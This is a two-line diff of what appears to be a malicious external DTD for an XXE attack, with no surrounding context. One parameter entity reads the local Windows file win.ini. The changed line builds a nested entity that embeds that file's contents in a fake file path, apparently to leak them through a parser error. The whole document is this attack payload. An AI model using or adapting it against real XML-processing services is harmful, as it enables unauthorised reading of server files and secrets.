@@ -1,2 +1,2 @@
 <!ENTITY % file SYSTEM "file:///c:/windows/win.ini">
-<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'file'>">
+<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'file:///etc/%file;'>">
